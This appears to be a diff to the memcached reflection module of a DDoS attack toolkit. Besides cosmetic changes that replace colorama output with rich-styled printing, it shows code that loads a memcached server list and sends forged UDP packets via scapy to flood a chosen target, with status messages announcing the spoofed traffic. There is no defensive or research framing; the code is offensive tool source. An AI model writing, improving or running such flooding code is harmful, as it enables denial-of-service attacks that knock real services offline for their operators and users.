@@ -1,9 +1,14 @@
 # Import modules
 import random
-from scapy.all import IP, UDP, send, Raw
-from colorama import Fore
+from rich.console import Console
 from bin.addons.utils import __path
+from scapy.all import IP, UDP, send, Raw
 
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+yellow = "yellow1"
 
 # Load MEMCACHED servers list
 with open(__path("bin", "config", "memcached_servers.txt"), "r") as f:
@@ -26,10 +31,8 @@ def flood(target):
         )
         send(packet, count=packets, verbose=False)
     except Exception as e:
-        print(
-            f"{Fore.MAGENTA}Error while sending forged UDP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
-        )
+        print(f"[{red}]Error while sending forged UDP packet\n{e}[/{red}]")
     else:
         print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
+            f"[{green}][+] [{yellow}]Sending {packets} forged UDP packets from memcached server {server} to {'{}:{}'.format(*target)}"
         )
